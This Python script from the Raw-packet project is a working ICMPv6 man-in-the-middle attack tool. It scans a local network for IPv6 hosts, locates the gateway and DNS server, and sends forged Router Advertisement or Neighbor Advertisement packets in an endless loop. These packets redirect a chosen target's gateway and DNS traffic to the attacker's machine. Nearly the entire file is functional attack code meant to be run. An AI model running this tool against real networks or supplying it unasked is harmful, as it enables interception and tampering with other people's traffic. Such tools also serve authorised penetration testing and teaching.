#!/usr/bin/env python
# -*- coding: utf-8 -*-

# region Description
"""
icmpv6_na_spoof.py: ICMPv6 NA (Neighbor Advertisement) spoofing
Author: Vladimir Ivanov
License: MIT
Copyright 2019, Raw-packet Project
"""
# endregion

# region Import
from sys import path
from os.path import dirname, abspath
from argparse import ArgumentParser
from socket import socket, AF_PACKET, SOCK_RAW
from time import sleep
from prettytable import PrettyTable
from typing import Union, Dict, List
# endregion

# region Authorship information
__author__ = 'Vladimir Ivanov'
__copyright__ = 'Copyright 2019, Raw-packet Project'
__credits__ = ['']
__license__ = 'MIT'
__version__ = '0.2.1'
__maintainer__ = 'Vladimir Ivanov'
__email__ = 'ivanov.vladimir.mail@gmail.com'
__status__ = 'Development'
# endregion

# region Main function
if __name__ == '__main__':

    # region Import Raw-packet classes
    path.append(dirname(dirname(dirname(abspath(__file__)))))

    from raw_packet.Utils.base import Base
    from raw_packet.Scanners.scanner import Scanner
    from raw_packet.Scanners.icmpv6_scanner import ICMPv6Scan
    from raw_packet.Utils.network import RawICMPv6

    base: Base = Base()
    icmpv6: RawICMPv6 = RawICMPv6()
    icmpv6_scan: ICMPv6Scan = ICMPv6Scan()
    scanner: Scanner = Scanner()
    raw_socket: socket = socket(AF_PACKET, SOCK_RAW)
    # endregion

    # region Check user, platform and create threads
    base.check_user()
    base.check_platform()
    # endregion

    try:

        # region Parse script arguments
        parser = ArgumentParser(description='ICMPv6 spoofing')
        parser.add_argument('-T', '--technique', type=int, default=None,
                            help='Set ICMPv6 MiTM technique (example: 1)' +
                                 '\n1. ICMPv6 RA (Router Advertisement) Spoofing' +
                                 '\n2. ICMPv6 NA (Neighbor Advertisement) Spoofing')
        parser.add_argument('-i', '--interface', help='Set interface name for send ARP packets')
        parser.add_argument('-t', '--target_ip', help='Set target IPv6 link local address', default=None)
        parser.add_argument('-m', '--target_mac', help='Set target MAC address', default=None)
        parser.add_argument('-g', '--gateway_ip', help='Set gateway IPv6 link local address', default=None)
        parser.add_argument('-p', '--ipv6_prefix', help='Set IPv6 prefix, default="fde4:8dba:82e1:ffff::/64"',
                            default='fde4:8dba:82e1:ffff::/64')
        parser.add_argument('-d', '--dns_ip', help='Set DNS server IPv6 link local address', default=None)
        parser.add_argument('-n', '--dns_domain_search', help='Set DNS domain search; default: "local"',
                            default='local')
        parser.add_argument('-q', '--quiet', action='store_true', help='Minimal output')
        args = parser.parse_args()
        # endregion

        # region Print banner if argument quit is not set
        if not args.quiet:
            base.print_banner()
        # endregion

        # region Get your network settings
        if args.interface is None:
            base.print_warning('Please set a network interface for sniffing ICMPv6 responses ...')
        current_network_interface: str = base.network_interface_selection(args.interface)
        your_mac_address: str = base.get_interface_mac_address(current_network_interface)
        your_ipv6_link_address: str = base.get_interface_ipv6_link_address(current_network_interface)
        # endregion

        # region Local variables
        techniques = {
            1: 'ICMPv6 RA (Router Advertisement) Spoofing',
            2: 'ICMPv6 NA (Neighbor Advertisement) Spoofing'
        }
        technique_index: int = 0
        target_ipv6_address: Union[None, str] = None
        target_mac_address: Union[None, str] = None
        gateway_ipv6_address: Union[None, str] = None
        gateway_mac_address: Union[None, str] = None
        dns_ipv6_address: Union[None, str] = None
        prefix: Union[None, str] = None
        mtu: int = 1500
        router_lifetime: int = 2
        reachable_time: int = 2000
        retrans_timer: int = 2000
        advertisement_interval: int = 2000
        # endregion

        # region Check arguments: target_ip and target_mac

        # region Check argument: target_mac
        if args.target_mac is not None:
            assert base.mac_address_validation(args.target_mac), \
                'Bad value "-m, --target_mac": ' + base.error_text(args.target_mac) + \
                '; Example MAC address: ' + base.info_text('12:34:56:78:90:ab')
            target_mac_address = str(args.target_mac).lower()
        # endregion

        # region Set variable for scan results
        target: Union[None, Dict[str, str]] = None
        # endregion

        # region Search targets in local network
        if args.target_ip is None:
            base.print_info('Search IPv6 alive hosts ....')
            ipv6_devices = scanner.find_ipv6_devices(network_interface=current_network_interface, timeout=3, retry=3,
                                                     exclude_ipv6_addresses=[gateway_ipv6_address])
            # Target IPv6 and MAC address is not set
            if target_mac_address is None:
                target = scanner.ipv6_device_selection(ipv6_devices)
                target_ipv6_address = target['ip-address']
                target_mac_address = target['mac-address']

            # Target MAC address is set but target IPv6 is not set
            else:
                for ipv6_device in ipv6_devices:
                    if ipv6_device['mac-address'] == target_mac_address:
                        target_ipv6_address = ipv6_device['ip-address']
                assert target_ipv6_address is not None, \
                    'Could not found IPv6 device with MAC address: ' + base.error_text(target_mac_address)
        # endregion

        # region Check argument: target_ip
        else:
            assert args.target_mac is not None, \
                'Target IPv6 address is set. Please set target MAC address "-m, --target_mac"'
            assert base.ipv6_address_validation(args.target_ip), \
                'Bad value "-t, --target_ip": ' + base.error_text(args.target_ip) + '; Failed to validate ipv6 address!'
            assert str(args.target_ip).startswith('fe80::'), \
                'Bad value "-t, --target_ip": ' + base.error_text(args.target_ip) + \
                '; Target link local ipv6 address must be starts with: ' + base.info_text('fe80::')
            assert args.target_ip != your_ipv6_link_address, \
                'Bad value "-t, --target_ip": ' + base.error_text(args.target_ip) + \
                '; Target IPv6 address is your link local IPv6 address!'
            target_ipv6_address = args.target_ip
        # endregion

        # region Print Target information
        base.print_success('Target IPv6 address: ', target_ipv6_address)
        base.print_success('Target MAC address: ', target_mac_address)
        if target is not None:
            if isinstance(target, dict):
                if 'vendor' in target.keys():
                    base.print_success('Target Vendor: ', target['vendor'])
        target = None
        # endregion

        # endregion

        # region Set technique
        technique_pretty_table = PrettyTable([base.info_text('Index'), base.info_text('ICMPv6 MiTM technique')])
        for technique_key in techniques.keys():
            technique_pretty_table.add_row([str(technique_key), techniques[technique_key]])

        if args.technique is None:
            base.print_info('ICMPv6 MiTM technique list:')
            print(technique_pretty_table)
            current_technique_index: str = input(base.c_info + 'Set ICMPv6 MiTM technique index from range (1 - ' +
                                                 str(len(techniques.keys())) + '): ')
            assert current_technique_index.isdigit(), \
                'ICMPv6 MiTM technique index is not digit!'
            current_technique_index: int = int(current_technique_index)
            assert not any([current_technique_index < 1, current_technique_index > len(techniques.keys())]), \
                'ICMPv6 MiTM technique index is not within range (1 - ' + str(len(techniques.keys())) + ')'
            technique_index = current_technique_index
        else:
            assert int(args.technique) == 1 or int(args.technique) == 2, \
                'Bad technique index, technique must be: \n' + str(technique_pretty_table)
            technique_index = int(args.technique)
        # endregion

        # region Bind raw socket
        raw_socket.bind((current_network_interface, 0))
        # endregion

        # region General output
        if not args.quiet:
            base.print_info('Network interface: ', current_network_interface)
            base.print_info('Your IPv6 address: ', your_ipv6_link_address)
            base.print_info('Your MAC address: ', your_mac_address)
        # endregion

        # region Check arguments: gateway_ip and dns_ip

        # region Search Gateway and DNS servers
        router_advertisement_data: Union[None, Dict[str, Union[int, str]]] = None
        if args.gateway_ip is None and args.dns_ip is None:
            base.print_info('Search IPv6 Gateway and DNS server ....')
            router_advertisement_data: Union[None, Dict[str, Union[int, str]]] = \
                icmpv6_scan.search_router(network_interface=current_network_interface,
                                          timeout=5, retry=3, exit_on_failure=False)
            # region Find IPv6 router
            if router_advertisement_data is not None:
                gateway_ipv6_address = router_advertisement_data['router_ipv6_address']
                gateway_mac_address = router_advertisement_data['router_mac_address']
                if 'dns-server' in router_advertisement_data.keys():
                    dns_ipv6_address = router_advertisement_data['dns-server']
                else:
                    dns_ipv6_address = your_ipv6_link_address
                if 'prefix' in router_advertisement_data.keys():
                    prefix = router_advertisement_data['prefix']
                else:
                    prefix = args.ipv6_prefix
                if 'mtu' in router_advertisement_data.keys():
                    mtu = int(router_advertisement_data['mtu'])
            # endregion

            # region Could not find IPv6 router
            else:
                gateway_ipv6_address = your_ipv6_link_address
                gateway_mac_address = your_mac_address
                prefix = args.ipv6_prefix
                dns_ipv6_address = your_ipv6_link_address
            # endregion

        # endregion

        # region Check arguments: gateway_ip and dns_ip
        else:
            # region Check argument: gateway_ip
            if args.gateway_ip is not None:
                assert base.ipv6_address_validation(args.gateway_ip), \
                    'Bad value "-g, --gateway_ip": ' + base.error_text(args.gateway_ip) + \
                    '; Failed to validate ipv6 address!'
                assert str(args.gateway_ip).startswith('fe80::'), \
                    'Bad value "-g, --gateway_ip": ' + base.error_text(args.gateway_ip) + \
                    '; Gateway link local ipv6 address must be starts with: ' + base.info_text('fe80::')
                assert args.gateway_ip != your_ipv6_link_address, \
                    'Bad value "-g, --gateway_ip": ' + base.error_text(args.gateway_ip) + \
                    '; Gateway IPv6 address is your Link local IPv6 address!'
                gateway_ipv6_address = args.gateway_ip
            # endregion

            # region Check argument: dns_ip
            if args.dns_ip is not None:
                assert base.ipv6_address_validation(args.dns_ip), \
                    'Bad value "-d, --dns_ip": ' + base.error_text(args.dns_ip) + '; Failed to validate ipv6 address!'
                assert str(args.dns_ip).startswith('fe80::'), \
                    'Bad value "-d, --dns_ip": ' + base.error_text(args.dns_ip) + \
                    '; DNS link local ipv6 address must be starts with: ' + base.info_text('fe80::')
                assert args.dns_ip != your_ipv6_link_address, \
                    'Bad value "-d, --dns_ip": ' + base.error_text(args.dns_ip) + \
                    '; DNS IPv6 address is your Link local IPv6 address!'
                dns_ipv6_address = args.dns_ip
            # endregion
        # endregion

        # region Print Gateway and DNS server information
        base.print_success('Gateway IPv6 address: ', gateway_ipv6_address)
        if gateway_mac_address is not None:
            base.print_success('Gateway MAC address: ', gateway_mac_address)
        if router_advertisement_data is not None:
            base.print_success('Gateway Vendor: ', router_advertisement_data['vendor'])
        if dns_ipv6_address is not None:
            base.print_success('DNS IPv6 address: ', dns_ipv6_address)
        base.print_success('IPv6 prefix: ', prefix)
        base.print_success('MTU: ', str(mtu))
        base.print_success('Router lifetime (s): ', str(router_lifetime))
        base.print_success('Reachable time (ms): ', str(reachable_time))
        base.print_success('Retrans timer (ms): ', str(retrans_timer))
        # endregion

        # region Check target IP and gateway IP
        assert args.target_ip != gateway_ipv6_address, \
            'Bad value "-t, --target_ip": ' + base.error_text(args.target_ip) + \
            '; Target IPv6 address is gateway link local IPv6 address!'
        # endregion

        # endregion

        # region Start spoofing
        base.print_info('Spoof NDP table: ', gateway_ipv6_address + ' -> ' + your_mac_address)
        spoof_packets: List[bytes] = list()

        if technique_index == 1:
            base.print_info("Send Router Advertisement packets to: ", target_ipv6_address +
                            " (" + target_mac_address + ")")
            base.print_info("Start Router Advertisement spoofing ...")
            spoof_packets.append(icmpv6.make_router_advertisement_packet(ethernet_src_mac=your_mac_address,
                                                                         ethernet_dst_mac=target_mac_address,
                                                                         ipv6_src=gateway_ipv6_address,
                                                                         ipv6_dst=target_ipv6_address,
                                                                         dns_address=dns_ipv6_address,
                                                                         domain_search=args.dns_domain_search,
                                                                         prefix=prefix,
                                                                         mtu=mtu,
                                                                         src_link_layer_address=your_mac_address,
                                                                         router_lifetime=router_lifetime,
                                                                         reachable_time=reachable_time,
                                                                         retrans_timer=retrans_timer,
                                                                         advertisement_interval=advertisement_interval))

        if technique_index == 2:
            base.print_info('Send Neighbor Advertisement packets to: ', target_ipv6_address +
                            ' (' + target_mac_address + ')')
            base.print_info('Start Neighbor Advertisement spoofing ...')
            spoof_packets.append(icmpv6.make_neighbor_advertisement_packet(ethernet_src_mac=your_mac_address,
                                                                           ethernet_dst_mac=target_mac_address,
                                                                           ipv6_src=gateway_ipv6_address,
                                                                           ipv6_dst=target_ipv6_address,
                                                                           target_ipv6_address=gateway_ipv6_address))
            if dns_ipv6_address != your_ipv6_link_address and dns_ipv6_address != gateway_ipv6_address:
                spoof_packets.append(icmpv6.make_neighbor_advertisement_packet(ethernet_src_mac=your_mac_address,
                                                                               ethernet_dst_mac=target_mac_address,
                                                                               ipv6_src=dns_ipv6_address,
                                                                               ipv6_dst=target_ipv6_address,
                                                                               target_ipv6_address=dns_ipv6_address))
        while True:
            for spoof_packet in spoof_packets:
                raw_socket.send(spoof_packet)
                sleep(0.25)
        # endregion

    except KeyboardInterrupt:
        raw_socket.close()
        base.print_info('Exit')
        exit(0)

    except AssertionError as Error:
        raw_socket.close()
        error_text = Error.args[0]
        base.print_error(error_text)
        exit(1)
    # endregion

# endregion
